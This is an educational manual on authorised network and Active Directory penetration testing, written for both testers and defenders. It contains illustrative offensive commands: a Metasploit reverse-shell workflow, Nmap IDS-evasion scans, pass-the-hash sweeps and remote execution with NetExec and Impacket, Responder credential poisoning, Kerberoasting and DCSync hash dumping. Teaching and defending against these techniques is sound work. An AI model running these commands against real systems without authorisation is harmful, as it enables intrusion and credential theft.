A network penetration test is a sanctioned attack. A tester is hired to behave, for a fixed window and within an agreed boundary, like a capable intruder — to find the route a real adversary would take through an organisation's infrastructure and to prove that the route exists before someone uninvited finds it first. The work is technical, but its defining feature is not technique. It is permission. Strip away the written authorisation and the same packets, the same captured hashes, the same shell on a domain controller become a federal crime rather than a professional service.

This manual walks the full arc of an infrastructure engagement — external and internal, from the first passive lookup to a forged ticket that owns the forest — and names the standards, the tooling, and the discipline that hold it together. It is written for people who already speak TCP/IP and the Windows security model, and it treats the marquee tools (Nmap, Metasploit, NetExec, Impacket, BloodHound, Responder) not as a grab-bag of exploits but as instruments inside a methodology. Throughout, every claim of fact is anchored to a primary source; the offensive techniques described are the same ones taught in professional certification tracks and documented in the tools' own manuals, and they are presented here so that defenders and testers share one vocabulary.

01The discipline & the law

Permission is the whole product

What separates a penetration tester from an attacker is not skill, intent, or even outcome. It is a signed piece of paper.

In the United States, unauthorised access to a networked computer is governed by the Computer Fraud and Abuse Act, codified at 18 U.S.C. § 1030.7 The statute prohibits accessing a computer "without authorisation" or in a manner that "exceeds authorised access," and a separate provision criminalises knowingly causing damage to a protected computer — a category that, in practice, includes nearly any machine attached to the internet. Crucially, the CFAA contains no carve-out for security research or good-faith testing. Authorisation is the operative concept, and it is binary: access that falls outside the scope of written permission can constitute a felony regardless of the tester's intent, carrying penalties of up to a decade of imprisonment for first offences involving damage or fraud.7 The lesson is not subtle. The legal status of an engagement is decided entirely by documentation, and a technically identical action is either lawful work or a crime depending on whether a piece of paper exists.

The pattern repeats internationally. The United Kingdom's Computer Misuse Act 1990 criminalises unauthorised access and unauthorised acts impairing a computer's operation,8 and engagements that touch the personal data of EU residents fall under the General Data Protection Regulation, which imposes strict obligations on how any data encountered during testing is handled and disclosed.9 Cloud-hosted targets add another layer: the major providers each publish their own testing policies, and a tester who pivots onto infrastructure owned by a third party may need that party's separate consent before a single probe is sent.

Rules of engagement — the paperwork that makes it legal

A professional engagement is bounded by a small stack of documents executed before any traffic is generated: a scope defining exactly which hosts, ranges, and applications are in and out of bounds; a statement of work setting objectives and timelines; rules of engagement fixing test windows, permitted techniques, evidence handling, and an emergency contact; a signed authorisation letter from someone with the standing to grant it; and an NDA binding the tester to confidentiality. When a critical finding or out-of-scope system surfaces mid-test, the rules of engagement — not the tester's curiosity — dictate what happens next.

Internal, external, and how much the tester is told

Infrastructure testing splits along two axes. The first is vantage point. An external test models an attacker on the public internet with no prior foothold, probing internet-facing services — VPN gateways, mail servers, web front-ends, exposed management interfaces — for a way in. An internal test assumes the attacker is already on the corporate LAN: a malicious insider, a compromised laptop, a planted device, or simply the logical next step after an external breach. Internal testing is where the most damaging findings usually live, because once an adversary is past the perimeter the network's interior is frequently flat, over-trusting, and rich with the credential material that Active Directory runs on. Many engagements are scoped as "assume breach" precisely to skip the entry problem and spend the budget where it matters.

The second axis is knowledge. In black-box testing the tester is given nothing beyond a company name or an IP range and must discover everything, mimicking an outside adversary. In white-box (or crystal-box) testing the tester receives architecture diagrams, credentials, and sometimes source, maximising coverage in limited time. Grey-box testing sits between the two — typically a standard user account and partial documentation — and is the most common arrangement for internal infrastructure work because it reflects the realistic starting position of a phished employee or a contractor with low-level access.

The interior of most networks is a soft target wearing a hard shell. The perimeter is the part everyone watches; the part attackers actually live in is the part nobody segmented.

02Standards & methodology

A repeatable shape for chaos

Without a methodology, a "penetration test" can mean anything from a thorough adversary simulation to a scanner run with a cover page. Standards exist to fix the floor.

The foundational reference in the field is NIST Special Publication 800-115, the Technical Guide to Information Security Testing and Assessment, published in 2008 by Scarfone, Souppaya, Cody, and Orebaugh.1 It does not prescribe a single methodology; instead it organises technical testing into three families — review techniques (examining documentation, logs, rulesets, and configurations), target identification and analysis (network discovery, port and service identification, vulnerability scanning), and target vulnerability validation (password cracking, social engineering, and penetration testing) — and it remains the document that compliance frameworks point to when they need an authoritative definition of what testing involves.1

Where NIST 800-115 supplies the vocabulary, the Penetration Testing Execution Standard (PTES) supplies the shape. Written by a working group of practitioners and first published in 2009, PTES divides an engagement into seven phases, each with defined inputs and outputs, and it pairs a high-level guidelines document with a deep technical guidelines companion describing the specific tools and techniques used at each step.2 Its real contribution was social as much as technical: before PTES, firms disagreed on what a "penetration test" even included, and the standard established that a complete test demonstrates genuine impact through exploitation rather than stopping at a list of theoretical weaknesses.2 The phases below structure the rest of this manual.

Several other bodies of knowledge sit alongside PTES and are worth recognising by name. The Open Source Security Testing Methodology Manual (OSSTMM), maintained by ISECOM, takes a scientific, metrics-driven approach and ranges across human, physical, wireless, telecommunications, and data-network security.3 The OWASP Web Security Testing Guide is the definitive checklist for the application layer and complements network-focused standards when web front-ends are in scope.4 And the MITRE ATT&CK knowledge base — a curated matrix of the tactics and techniques real adversaries use, spanning fourteen tactics from Reconnaissance through Impact across the attack lifecycle — provides the shared technique IDs that let a finding be mapped to documented adversary behaviour.5 ATT&CK is not itself a testing methodology, but it has become the lingua franca for describing what was done once a tester has done it.5

The regulation that mandates the work

For most organisations, the practical reason a penetration test happens at all is compliance. The Payment Card Industry Data Security Standard makes testing explicit: under PCI DSS v4.0, Requirement 11.4 obliges entities that handle cardholder data to maintain a documented testing methodology (11.4.1), to perform internal penetration testing (11.4.2) and external penetration testing (11.4.3) at least every twelve months and after any significant change, and to remediate and retest exploitable findings (11.4.4).41 The standard names NIST SP 800-115 as an acceptable basis for that methodology and, in its accompanying Penetration Testing Guidance supplement, is explicit that running an automated scanner and exporting the output does not constitute a penetration test — human analysis and creative exploitation are required.42 Other regimes echo the requirement: the NIST Cybersecurity Framework 2.0 frames testing as evidence feeding the Identify and Detect functions of a risk-management programme,6 and sector rules across finance, healthcare, and critical infrastructure increasingly treat periodic testing as a baseline rather than a nicety.

Field note — a test is not a scan

The single most common way a "penetration test" disappoints is by being a vulnerability scan in disguise. A scan enumerates potential weaknesses at breadth; a penetration test takes a subset of them and proves real impact at depth — chaining a medium-severity misconfiguration into a foothold, the foothold into credentials, and the credentials into the crown jewels. The standards exist largely to keep the second thing from collapsing into the first.

03Reconnaissance

Mapping before touching

Intelligence gathering is the phase where careful testers spend disproportionate effort, because everything downstream is only as good as the picture of the target.

Reconnaissance is the first thing a real adversary does and, in MITRE ATT&CK, the first tactic in the enterprise lifecycle — gathering information to plan later operations.5 It divides into passive and active work. Passive reconnaissance never touches the target's systems directly: it draws on public DNS records, WHOIS registration data, certificate-transparency logs that leak internal hostnames, search-engine results, code repositories, breach-data corpora, employee profiles, and internet-wide scan databases that already catalogue exposed services. Done well, passive recon can sketch an organisation's external attack surface — its domains, netblocks, mail infrastructure, cloud tenancy, and technology stack — without sending a single packet that the target could log.

Active reconnaissance crosses that line deliberately, interrogating live systems to confirm what passive sources only suggested: which hosts in a range are up, which respond to which protocols, and how the network is laid out. On an external engagement this means resolving and probing the discovered netblocks; on an internal one it means sweeping the local segments, listening to the broadcast and multicast chatter that Windows networks emit constantly, and inferring the shape of the domain. The discipline here is to expand the map methodically rather than charging at the first open port — an attack surface understood in full yields footholds that a hasty scan would miss.

Field note — the enumeration mantra

Veteran testers repeat a single instruction more than any other: enumerate, then enumerate again. The richest findings rarely come from a clever exploit; they come from noticing the one service, share, account, or stale record that everyone else's automated sweep skipped over. Time spent widening and deepening the map is almost never wasted.

04Port scanning

Which doors exist, and are they open

Port scanning turns a list of live hosts into a map of reachable services. For three decades the instrument of record has been Nmap.

Nmap — the Network Mapper — was first released in September 1997 by Gordon Lyon, who writes under the handle Fyodor and still coordinates its development. It discovers hosts and services by sending crafted packets and analysing the responses, and its capabilities, options, and packet-level behaviour are documented exhaustively in Lyon's own book, Nmap Network Scanning, the official project guide.10 Understanding what a scan does on the wire is foundational, because every later decision — what to enumerate, what to exploit, how to evade detection — flows from how the target's TCP/IP stack answered.

A scan's output is a set of port states, and Nmap's precision about them is part of why it endures: a port is reported as open (a service is listening and accepted the probe), closed (reachable but nothing is listening), or filtered (a firewall or filter dropped the probe so its state cannot be determined), with unfiltered, open|filtered, and closed|filtered covering the ambiguous cases.11 The default and most useful technique is the TCP SYN scan (-sS), often called the half-open or stealth scan: Nmap sends a SYN, reads the response, and tears the nascent connection down before it completes, which is faster than a full connect and lets it cleanly distinguish the three core states. The SYN scan requires raw-packet privileges and is therefore the default whenever Nmap runs as root or Administrator; without those privileges it falls back to the full TCP connect scan (-sT).12 Lyon is candid that the "stealth" label is historical — modern intrusion-detection systems and even personal firewalls detect a default SYN scan easily, and genuine evasion is a separate craft covered later in this manual.12

The reference network scanner and the spine of the recon and scanning phases. Beyond raw port discovery, Nmap's version-detection engine matches service responses against a signature database to name the software and version behind each open port,13 and the Nmap Scripting Engine (NSE) extends it with hundreds of Lua scripts for deeper enumeration, vulnerability checks, and even safe exploitation — turning a scanner into a lightweight assessment platform.14 Its timing templates (-T0 paranoid through -T5 insane) trade speed against stealth and load, a control that matters as much for not toppling fragile production services as for slipping past detection.

05Service enumeration

Making services talk

A port scan says a service is there. Enumeration asks it questions — names, versions, shares, sessions, accounts, policies — until it gives up something useful.

Service enumeration is the bridge between "a port is open" and "here is the way in." Version detection identifies the software; enumeration extracts the operational detail an attacker needs to act on it. The richest targets on a corporate network are the Windows file-sharing and directory protocols, because they leak structure. The SMB service on TCP 445 can frequently be coaxed — through a null session, a guest account, or any low-privileged credential — into listing shares, enumerating logged-on sessions, dumping the local and domain user lists, and revealing the password policy that governs how aggressively an attacker can guess. LDAP on a domain controller exposes the directory itself: users, groups, computers, organisational units, and the service-account markers that later become Kerberos targets. SNMP, RPC, NetBIOS, and a dozen other protocols each have their own enumeration surface, and a careful tester works each one in turn.

For Active Directory environments, the enumeration workhorse is NetExec (invoked as nxc), the actively maintained successor to the long-serving CrackMapExec.29 It speaks SMB, WinRM, LDAP, MSSQL, RDP, FTP, and SSH, and across those protocols it validates credentials at scale, enumerates users, groups, shares, and password policies, and identifies the misconfigurations that turn a single valid login into a network-wide problem.30 A typical early move is to take one low-privileged account and ask the domain for its own password policy before doing anything noisy — because spraying credentials without knowing the lockout threshold is how a tester causes an outage and gets caught in the same motion.

illustrative — authorised domain, supplied account
# confirm a credential and read the domain password policy first
$ nxc smb 10.10.20.0/24 -u 'j.smith' -p 'Spring2026!' --pass-pol
# enumerate shares this account can reach across the subnet
$ nxc smb 10.10.20.0/24 -u 'j.smith' -p 'Spring2026!' --shares
SMB  10.10.20.30  [+] CORP\j.smith  (Pwn3d! = False)
SMB  10.10.20.30  READ      \\FILE-01\Departments
SMB  10.10.20.30  READ,WRITE \\FILE-01\Profiles$

Field note — banners lie, behaviour doesn't

Service banners can be altered, masked, or simply wrong. The strongest enumeration leans on how a service behaves — which authentication it accepts, which shares it exposes, which error it returns — rather than what it claims to be. A web server announcing one version while behaving like another is itself a finding.

06Vulnerability assessment

From breadth to a shortlist

Scanners find candidate weaknesses fast and at scale. The tester's job is to separate the real from the noise — and then to prove it.

A vulnerability assessment is a largely automated review that compares discovered software, versions, and configurations against databases of known weaknesses, producing a broad inventory sorted by severity. It is deliberately a breadth-first exercise, and it is not a penetration test: a scanner reports what might be exploitable, while a tester demonstrates what actually is. The two are complementary — assessment narrows the field, exploitation proves impact — and conflating them is the error the PCI guidance was written to forbid.42

The dominant commercial scanner is Tenable Nessus, with broad vulnerability coverage and built-in compliance checks;21 the leading open-source alternative is OpenVAS, maintained within Greenbone's vulnerability-management stack.22 Both lean on a shared public vocabulary. Individual flaws are catalogued as CVE identifiers under the programme run by MITRE,26 enriched with descriptions and metadata in NIST's National Vulnerability Database,24 and scored for severity using the Common Vulnerability Scoring System maintained by FIRST, whose qualitative bands map numeric scores to the Critical / High / Medium / Low labels that drive remediation priority.23 Because a high CVSS base score says nothing about whether a flaw is actually being exploited in the wild, many teams now pair it with the Exploit Prediction Scoring System (EPSS), also from FIRST, which estimates the probability of exploitation and helps a tester argue which findings deserve attention first.25

The decisive skill in this phase is validation. Scanners produce false positives — a back-ported security patch on an enterprise Linux distribution, for instance, can leave a version string that looks vulnerable while the flaw is already fixed — and they miss findings that only an authenticated, credentialed scan or a human eye would catch. A professional treats scanner output as a set of leads to confirm by hand, discarding the phantoms and promoting the genuine weaknesses into the exploitation phase with evidence attached. This is also where the tester begins to think in chains: a single medium-severity issue is often uninteresting alone but lethal as the first link toward credentials and, from there, the directory.

07Exploitation

Proving the door opens

Exploitation is the moment a validated weakness becomes access. It is also the moment a test most needs restraint, because the target is production.

Exploitation converts a confirmed vulnerability into a foothold — a shell, a session, a set of credentials — and thereby supplies the proof that separates a penetration test from a scan. The framework that defines the modern exploitation phase is Metasploit, created by HD Moore in 2003 as a Perl project to consolidate scattered exploit code, rewritten in Ruby for the 3.0 release in 2007, and acquired by Rapid7 in 2009.19 Its enduring design idea is modularity: the framework cleanly separates exploits (code that triggers a specific vulnerability) from payloads (code that runs once the exploit lands), alongside auxiliary modules for scanning and other non-exploit actions, post modules for work after access, and encoders and NOP generators that shape a payload's bytes.19

The payload architecture rewards understanding. Metasploit assembles payloads from stagers and stages: a small stager establishes the connection and pulls down a larger stage, so a reference like windows/x64/meterpreter/reverse_tcp reads as platform, architecture, stage, and stager in sequence.20 The flagship stage is Meterpreter, an in-memory, extensible payload that gives the tester a rich command channel without writing files to disk. The whole apparatus is driven from msfconsole, which couples module selection and option-setting to a backing database that keeps hosts, services, and loot organised across a long engagement.19

illustrative — msfconsole workflow
msf6 > search type:exploit name:smb
msf6 > use exploit/windows/smb/<module>
msf6 > set RHOSTS 10.10.20.30
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.20.5
msf6 > check          # confirm the target is vulnerable before firing
msf6 > exploit

The standard framework for the exploitation and post-exploitation phases. Its breadth — thousands of exploit modules and hundreds of payloads — makes it the fastest path from a confirmed vulnerability to a working session, and its routing features make it a competent pivot platform once a foothold exists. That same convenience is why several certification tracks deliberately constrain it: the OSCP examination, for example, limits automated Metasploit use to a single target so that candidates demonstrate manual exploitation rather than leaning on the framework.43 The professional posture is to know it deeply and to use it deliberately — never to fire an untested exploit at a fragile production service without weighing the chance of a crash.

Field note — the blast radius is real

Exploits can crash services, corrupt data, and take production offline. The rules of engagement exist partly to govern this risk: which hosts tolerate intrusive testing, which require a maintenance window, and which are off-limits entirely. A finding proven safely is worth more than a heroic exploit that triggers an incident — and an unauthorised crash can convert a contracted test into a liability claim.

08Firewall & IDS/IPS evasion

The cat and the mouse

Defences shape traffic and watch for patterns. Evasion is the craft of operating beneath the threshold — and the same knowledge tells a defender exactly what to watch for.

Real adversaries do not announce themselves, and an engagement that ignores detective controls produces an unrealistic picture of risk. Firewalls drop or permit traffic by rule; intrusion-detection and -prevention systems inspect it for signatures and anomalies. Nmap ships a toolbox of evasion primitives aimed at both, documented in its manual's chapter on subverting firewalls and intrusion detection.15 Packet fragmentation (-f, or a custom --mtu) splits probes across multiple tiny IP fragments so that a signature engine which inspects packets individually cannot reassemble the pattern. Decoy scans (-D) interleave a scan with spoofed source addresses so the target's logs show probes from a handful of IPs without revealing which one is real.15 Source-address spoofing (-S), MAC-address spoofing (--spoof-mac), source-port manipulation, payload padding (--data-length) to defeat fixed-size signatures, and deliberately slow timing (-T0/-T1, --scan-delay) to stay below rate-based thresholds round out the kit.

None of this is new, and the theory is older than most of the tools. The canonical analysis is Ptacek and Newsham's 1998 paper, Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection, which established how differences between how a monitor and an endpoint interpret the same packet stream can be abused to slip attacks past inspection.16 Those insights still drive how modern sensors are built. On the defensive side, Snort — long the most widely deployed open-source IDS and now part of Cisco — and Suricata, the multi-threaded engine from the Open Information Security Foundation, both ship rules tuned to detect Nmap's signatures, and both can be configured to reassemble fragments and correlate the kind of low-and-slow, multi-source patterns that naive evasion produces.1718

illustrative — evasion primitives, authorised scope
# fragment probes and pad them past fixed-size signatures
$ sudo nmap -sS -f --data-length 64 10.10.20.30
# hide the real source among decoys (decoys must be live hosts)
$ sudo nmap -sS -D RND:5 10.10.20.30
# slow scan to stay under rate-based detection thresholds
$ sudo nmap -sS -T1 --scan-delay 900ms 10.10.20.30

Defender's read — evasion is a detection spec

Every evasion technique is also a detection opportunity. A blue team should not only hunt for the obvious port-scan burst; it should correlate fragmented packets arriving from multiple source addresses against the same host as a likely coordinated stealth scan, alert on unusual ACK-only or oddly flagged packets, and flag internal hosts making DNS queries to public resolvers. The offensive primitives in this section translate directly into Snort and Suricata rules. Understanding how a scan hides is the prerequisite to seeing it.

09Pivoting & lateral movement

One foothold is never the goal

A single compromised host is a beginning, not a conclusion. The interesting question is what that host can reach — and how an attacker turns one set of credentials into many.

The first machine an attacker lands on is rarely the prize. It is a vantage point: a place from which to reach networks that were never exposed to the internet, and a source of credentials that may unlock the rest of the estate. MITRE catalogues this entire problem space as Lateral Movement (TA0008) — the tactics an adversary uses to enter and control remote systems after gaining initial access.38 Two mechanics dominate it on a Windows network: reusing credential material, and abusing the remote-execution facilities that Windows administrators rely on every day.

Pivoting is the routing half of the problem. A foothold host that is dual-homed — or simply permitted through internal firewall rules that the perimeter is not — becomes a relay into segments the tester cannot otherwise touch. Frameworks tunnel traffic through that relay (SOCKS proxies, port forwards, or a Meterpreter session's route table) so that scanners and exploits launched from the attacker's machine emerge, logically, from inside. This is precisely why internal segmentation matters, and precisely what a segmentation test (§11) is designed to falsify.

The credential half is more corrosive. Windows authentication historically allowed a user's NTLM hash to authenticate on their behalf without the plaintext password ever being typed — the basis of the pass-the-hash technique, which MITRE tracks as Use Alternate Authentication Material: Pass the Hash (T1550.002).39 A hash dumped from one machine, if it belongs to an account with rights elsewhere, is as good as a key. The same logic extends to Kerberos tickets and to reused local-administrator passwords: one shared local-admin credential across a fleet means one compromised workstation is a compromise of all of them. Much of an internal engagement is the patient mapping of where a given secret is still valid.

Impacket protocol-level execution & credential tooling SecureAuth → Fortra · Python
github.com/fortra/impacket

Impacket is a collection of Python classes implementing the network protocols that Windows environments run on — SMB versions 1 through 3, MSRPC, DCOM, WMI, Kerberos, and LDAP — built so that low-level packets can be constructed and manipulated programmatically rather than only through Windows' own clients.27 Originally developed by SecureAuth and now maintained by Fortra's Core Security, it is less a single tool than a toolbox from which most modern Windows-attack tooling is built.28

Its example scripts are the working tester's staples. The execution family — psexec.py, smbexec.py, wmiexec.py, and atexec.py — each obtains command execution on a remote host through a different native mechanism (a service, SMB, WMI, and the task scheduler respectively), so that a defender blocking one path does not block them all. secretsdump.py extracts password hashes from the SAM and, against a domain controller with sufficient rights, from the directory itself; GetUserSPNs.py and GetNPUsers.py drive the Kerberos attacks of §10. Crucially, every one of these accepts a hash in place of a password, making Impacket the canonical pass-the-hash toolkit.27

Sitting above these primitives, NetExec turns credential-validation into a sweep. Pointed at a subnet with a username and a hash or password, it answers the lateral-movement question wholesale — on which of these hundred hosts is this credential a local administrator? — and can then execute commands, enumerate shares, or dump secrets across every host where the answer is yes.30 It is the connective tissue between holding a credential and understanding its blast radius.

illustrative — credential blast-radius mapping, authorised scope
# sweep a /24: where is this hash a local admin? (pass-the-hash)
$ netexec smb 10.10.20.0/24 -u admin -H <ntlm-hash>
# remote execution over WMI using a hash, not a password
$ wmiexec.py -hashes :<ntlm-hash> CORP/admin@10.10.20.30
# dump secrets from a reachable host with valid creds
$ secretsdump.py CORP/admin:<pass>@10.10.20.30

Defender's read — break the reuse, watch the execution

Lateral movement dies without credential reuse. Unique per-host local-administrator passwords (Microsoft's LAPS) collapse the pass-the-hash blast radius to a single machine; SMB signing blunts relay; and tiered administration (§13) prevents a workstation compromise from ever exposing a domain-admin token. On the detective side, the execution scripts above leave fingerprints — anomalous service creation (Event ID 7045), remote WMI process spawns, and scheduled-task registration from unexpected accounts are all high-fidelity signals when monitored.

10Active Directory attacks

The domain is the terrain

In most enterprises, Active Directory is the central nervous system of identity. It is also, for an internal tester, the richest and most consequential ground — a graph of trust relationships waiting to be walked.

Active Directory Domain Services is the directory that authenticates users, authorises access, and applies policy across the overwhelming majority of corporate Windows networks; Kerberos is its primary authentication protocol.40 That centrality is exactly what makes it the decisive objective of an internal engagement. Compromise of the domain — specifically of the accounts and hosts that control it — is functionally a compromise of everything the domain governs. The attacks that achieve it cluster into three families: poisoning the protocols that hand out credentials, abusing Kerberos itself, and reading the directory's own structure to find the shortest path to power.

Poisoning the network for credentials

When a Windows host tries to resolve a name that DNS cannot answer, it has historically fallen back to broadcast protocols — Link-Local Multicast Name Resolution (LLMNR, UDP 5355), NetBIOS Name Service (NBT-NS, UDP 137), and multicast DNS (mDNS, UDP 5353) — that ask the entire local segment "does anyone know this host?" Any machine on the segment may answer. Responder, written by Laurent Gaffié, does exactly that: it listens for these queries and replies "yes, that's me," coaxing the victim into authenticating to the attacker and surrendering an NTLMv2 challenge-response in the process.31

Responder LLMNR / NBT-NS / mDNS poisoner Laurent Gaffié · 2013–
Python · github.com/SpiderLabs/Responder

Responder combines a set of poisoners for LLMNR, NBT-NS, and mDNS with a suite of rogue authentication servers — SMB, HTTP, FTP, LDAP, MSSQL, and more — that exist to capture credentials once a poisoned victim connects.31 The typical prize is an NTLMv2 hash, which the tester takes offline to crack against a wordlist, or — more dangerously — relays in real time to a third host where that user has rights, using Impacket's ntlmrelayx.py. Run with analysis-only mode first, it doubles as a reconnaissance tool: simply listening reveals which segments are noisy with poisonable name-resolution traffic, and therefore exposed.

The relay variant is the sharper edge. If SMB signing is not enforced, a captured authentication can be forwarded to another machine rather than merely cracked — turning a passive listener into an active foothold without ever knowing the password. The defensive countermeasures are unambiguous and well documented: disable LLMNR and NBT-NS through group policy, and enforce SMB signing.40

Abusing Kerberos

Kerberos was designed to avoid sending passwords over the wire, but its ticketing mechanics create their own openings. Kerberoasting — first detailed by Tim Medin at DerbyCon in 2014 — exploits the fact that any authenticated domain user can request a service ticket (TGS) for any account that has a Service Principal Name, and that part of that ticket is encrypted with a key derived from the service account's password.35 The attacker requests the ticket legitimately, takes it offline, and brute-forces the password without ever touching the target service. MITRE tracks this as Kerberoasting (T1558.003), one branch of Steal or Forge Kerberos Tickets (T1558); its siblings include AS-REP roasting (T1558.004) against accounts that do not require pre-authentication, and the forging of golden and silver tickets once sufficient key material is in hand.36

The most decisive Kerberos-adjacent attack is DCSync. An account holding directory-replication rights can ask a domain controller to replicate account data — including password hashes — exactly as a legitimate second controller would, extracting the credentials of any user, up to and including the KRBTGT account that underwrites the whole Kerberos trust. MITRE catalogues it as OS Credential Dumping: DCSync (T1003.006); the same replication that makes a multi-controller domain resilient is what the attack subverts, and the relevant signal is directory-replication requests (Event ID 4662 / 5136) originating from a host that is not a domain controller.37 Impacket's secretsdump.py and GetUserSPNs.py, and NetExec's modules, drive these attacks in practice.27

illustrative — Active Directory credential attacks, authorised scope
# listen for and poison name-resolution; capture NTLMv2
$ sudo responder -I eth0
# request service tickets for all SPN accounts (Kerberoasting)
$ GetUserSPNs.py -request CORP/user:<pass>
# replicate hashes from the DC with replication rights (DCSync)
$ secretsdump.py -just-dc CORP/admin:<pass>@dc01.corp.local
10Active Directory · the graph

Six degrees of Domain Admin

The most important shift in Active Directory tradecraft was conceptual, not technical: the realisation that a domain is a graph, and that compromise is a pathfinding problem.

For years, attackers and defenders alike reasoned about Active Directory as a list — of users, of groups, of machines. The insight that reframed the discipline, introduced when BloodHound was released at DEF CON 24 in 2016 by Andy Robbins, Rohan Vazarkar, and Will Schroeder, was that the relationships between those objects form a directed graph, and that an attacker does not need to enumerate every privilege — only to find the shortest path from where they are to where they want to be.34 A user who can reset another user's password, who sits in a group that administers a machine, where a domain admin's session can be harvested, is three hops from total control. No human reliably sees that chain by reading access-control lists. A graph database finds it instantly.

BloodHound attack-path mapping via graph theory SpecterOps · 2016–
Neo4j · bloodhound.specterops.io

BloodHound applies graph theory to reveal hidden and unintended relationships within Active Directory and Entra ID, storing collected data in a Neo4j graph database and querying it with the Cypher query language.32 Data is gathered by a collector — the C# SharpHound for Windows, or the Python bloodhound.py — which enumerates the domain's users, groups, computers, sessions, and the rich set of access-control edges between them, then ingests the result for analysis.33 The tool ships in a free Community Edition and a commercial Enterprise edition, with recent versions adding OpenGraph support for modelling systems beyond AD.32

Its signature feature is a built-in query, Find Shortest Paths to Domain Admins, that renders the attack surface as a literal diagram of who-can-reach-what.32 For the defender, the same graph is the most powerful audit available: it exposes the dangerous, often-accidental privilege chains that no manual review would surface, and quantifies exactly how exposed the crown jewels are.

BloodHound's analytical backbone is the concept of Tier 0 — the set of assets that control the identity system itself: domain controllers, and the Domain Admins and Enterprise Admins groups.34 Everything in security architecture flows from protecting that tier, because anything that can compromise a Tier 0 asset can compromise the domain. The graph makes the central question concrete and measurable: from an arbitrary low-privilege starting point, how many hops to Tier 0, and along which edges? Closing an attack path means breaking one of those edges — removing an unnecessary admin right, clearing a stale session, fixing a misconfigured ACL — and watching the path disappear from the graph. This is the unifying idea of modern Active Directory defence: attack-path management, the continuous identification and elimination of the chains that lead to Tier 0.

A domain is not a list of permissions. It is a graph of trust — and an attacker only has to find one path the defenders never knew they had drawn.

11Network segmentation testing

Proving the walls are real

Segmentation is a control like any other: asserted in a diagram, but only meaningful if it holds under test. The job is to falsify the claim that two networks cannot talk.

Network segmentation divides an estate into zones so that a compromise in one cannot freely spread to another — isolating, classically, the cardholder-data environment from the general corporate network, or operational-technology systems from internet-facing IT. The premise of a segmentation test is adversarial: the architecture claims that a host in zone A cannot reach a host in zone B, and the tester's task is to prove or disprove that claim from a position inside zone A. This is distinct from a vulnerability test. It does not ask whether a service is exploitable; it asks whether a packet can even arrive.

The regulatory driver is explicit. PCI DSS Requirement 11.4.5 mandates that where segmentation is used to reduce scope, penetration testing must confirm that the segmentation controls are operational and effective, isolating the in-scope environment from out-of-scope systems — and this must be done at least annually. Requirement 11.4.6 tightens the cadence for service providers to at least every six months and after any change to segmentation controls.41 The test itself is methodical: from the lower-trust zone, attempt to reach the higher-trust zone across the full range of ports and protocols, and document every flow that succeeds where the design says it should fail. Each unexpected open path is a hole in the wall.

At Layer 2, the classic concern is VLAN hopping — escaping the virtual LAN a port is assigned to, either by abusing dynamic trunking negotiation to turn an access port into a trunk, or by double-tagging frames so a switch forwards them into a VLAN the attacker was never meant to reach. Validating isolation means confirming that trunking is disabled on access ports, that the native VLAN is not shared with user traffic, and that inter-VLAN routing is filtered as intended. The architectural endpoint of this thinking is microsegmentation and the zero-trust model, in which trust is never granted by network location alone and every flow is authenticated and authorised — collapsing the implicit-trust interior that lateral movement (§9) depends upon. A test against such an environment verifies that the policy engine actually denies what location-based filtering used to wave through.

Scope note — segmentation testing is a contract term

Because segmentation defines the boundary of what is in scope, getting it wrong cuts both ways: an untested control may be silently failing, while an over-broad test may stray into systems the rules of engagement never authorised. The flows to be tested, and the zones on each side of them, belong in the rules of engagement before a single packet is sent.

12Reporting the breach

The deliverable is the report

A client does not buy access to their own network. They buy the document that explains what was wrong, how much it mattered, and what to do about it. Everything before this section exists to produce it.

It is worth stating plainly: the engagement's product is not the compromise, it is the report. A perfect domain takeover that is poorly documented delivers little; a modest set of findings, clearly explained and credibly prioritised, can transform an organisation's security posture. This is also the line that separates a penetration test from a vulnerability scan. PCI's own guidance is emphatic that the raw output of an automated scanner is not a penetration test — the value lies in the human analysis, validation, and contextual judgement that a tester layers on top of the tooling.42

A professional report is conventionally written in two registers. The executive summary speaks to leadership in the language of business risk — what an attacker could ultimately achieve, what it would cost, and whether the overall posture is improving or declining — without assuming technical fluency. The technical body speaks to the engineers who must fix things: each finding documented with enough detail to reproduce it, evidence that it is real, an assessment of impact and likelihood, and concrete remediation guidance. NIST SP 800-115 frames this whole arc — planning, discovery, attack, and reporting — as the structure of a sound assessment, with reporting as the phase that converts technical activity into organisational action.1

Severity should be defended, not asserted. Anchoring ratings to the Common Vulnerability Scoring System gives findings a transparent, reproducible basis — and pairing CVSS's intrinsic severity with real-world exploit-likelihood signals such as EPSS, and with the specific business context of the asset involved, produces a prioritisation that survives scrutiny.23 The strongest reports go further still: they group individual findings into the attack chains they enable, so that leadership sees not a flat list of forty issues but the three sequences that actually lead to disaster. Finally, a finding is not closed until it is re-tested. The remediate-and-retest loop — mandated explicitly in regulated environments such as PCI — is what turns a report from a snapshot of failure into evidence of resolution.41

Craft note — write for the reader who has to act

The best technical finding in the world is worthless if the engineer reading it cannot reproduce the issue or understand the fix. Reproduction steps, affected-asset inventories, and specific remediation — patch this, disable that, enforce the other — are not padding; they are the part of the report that changes the network. Severity tells the reader how much to care; remediation tells them what to do.

13Reading it as a defender

Every attack is a control specification

The deepest value of offensive knowledge is defensive. Read backwards, the entire kill chain is a checklist of controls — each technique naming the precise countermeasure that would have stopped it.

A penetration test is not an end in itself; it is a forcing function for better defence. The modern posture begins with an assume-breach mindset — the working assumption that initial access is not a matter of if but when, which shifts attention from a hard perimeter toward the detection and containment of an attacker already inside. MITRE ATT&CK is the connective framework here: every technique a tester employs maps to documented detection and mitigation guidance, so a blue team can use the same matrix offensively-minded testers use to plan, but in reverse — to audit coverage technique by technique.5 The NIST Cybersecurity Framework 2.0 then situates those specific controls within the broader functions of Govern, Identify, Protect, Detect, Respond, and Recover.6

The single most consequential architectural defence against the Active Directory attacks of §10 is privileged-access tiering. Microsoft's Enterprise Access Model and its guidance on securing privileged access prescribe separating identities by tier so that high-privilege credentials are never exposed on lower-trust hosts — the structural countermeasure that denies an attacker the credential-harvesting chain BloodHound is built to find.54 Paired with the Local Administrator Password Solution (LAPS), which randomises local-admin passwords per machine, it collapses both the lateral-movement blast radius of §9 and the Tier 0 attack paths of §10. The table below reads the article backwards: each offensive phase, and the control that answers it.

